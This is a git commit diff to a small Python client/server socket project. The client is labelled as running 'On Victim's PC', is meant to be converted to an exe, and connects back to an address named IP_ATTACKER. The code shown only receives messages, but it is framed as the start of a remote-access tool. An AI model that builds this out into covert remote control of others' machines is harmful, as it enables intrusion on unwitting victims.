60f75443ff08dfc229c97b63afa86a34d62e5a9a
abhirules27 <abhirules27@gmail.com>
2022-08-15 20:08:49 +0530

    Client Code Updated

--- Client.py
+++ Client.py
@@ -1,25 +1,13 @@
-# Client Code:  Code 1
-# To be converted in exe
-
-# import socket
-# SERVER_IP='192.168.0.199'
-# SERVER_PORT=5678
-#
-# with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
-#     s.connect((socket.gethostname(), SERVER_PORT))
-#     data = s.recv(1024)
-#     print(data)
-#
-# input()                         #To stay on Screen
-# _________________________________________________________________
-
-# Client Code: Code 2 (On Victim's PC)
+# Client Code: (On Victim's PC). Convert in exe (new)
 
 import socket
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-s.connect((socket.gethostname(), 1234))
+IP_ATTACKER = '192.168.0.199'
+PORT = 1234
+s.connect((IP_ATTACKER, PORT))
 
 full_msg = ''
+
 while True:
     msg = s.recv(8)
     if len(msg) <= 0:
--- Server.py
+++ Server.py
@@ -24,6 +24,7 @@
 import socket
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 s.bind((socket.gethostname(), 1234))
+
 s.listen()
 
 while True:
